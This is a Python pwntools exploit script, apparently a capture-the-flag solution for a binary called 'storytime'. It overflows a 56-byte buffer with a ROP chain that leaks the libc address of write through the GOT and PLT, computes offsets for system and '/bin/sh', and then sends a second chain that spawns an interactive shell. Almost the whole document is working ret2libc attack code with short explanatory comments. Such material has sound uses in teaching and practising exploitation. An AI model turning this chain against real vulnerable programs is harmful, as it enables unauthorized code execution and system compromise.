from pwn import *

target = process('./storytime')

# first need to leak libc locations of everything
# so we need to use the got and plt location of 
# write to find the libc locations
plt = p64(0x4004a0)
got = p64(0x601018)
popRDI = p64(0x400703)
popRSIR15 = p64(0x400701)
main = p64(0x40062e)

# payload to leak address of write
payload = b""
payload += b"A" * 56 + popRDI + p64(0x1) + popRSIR15 + got + p64(0x0) + plt + main


target.sendline(payload)
target.recvuntil(b"Tell me a story: \n")

leak1 = target.recvline()

# take first 8 bytes which are the libc location of write
leak = leak1[0:8]
write = 0
count = 0
for i in leak:
    if count == 0:
        write |= i
    else:
        i <<= 8*count
        write |= i
    count += 1
libc_write = int(hex(write), 16)

# use offsets to find locations of important gadgets
libc_start = libc_write - 0x114a20
libc_system = libc_start + 0x50d60
libc_bin = libc_start + 0x1d8698

#now that we have all locations, we can now send missile then payload
payload = b"A" * 56 + popRDI + p64(libc_bin) + p64(libc_system)
target.sendline(payload)

target.interactive()
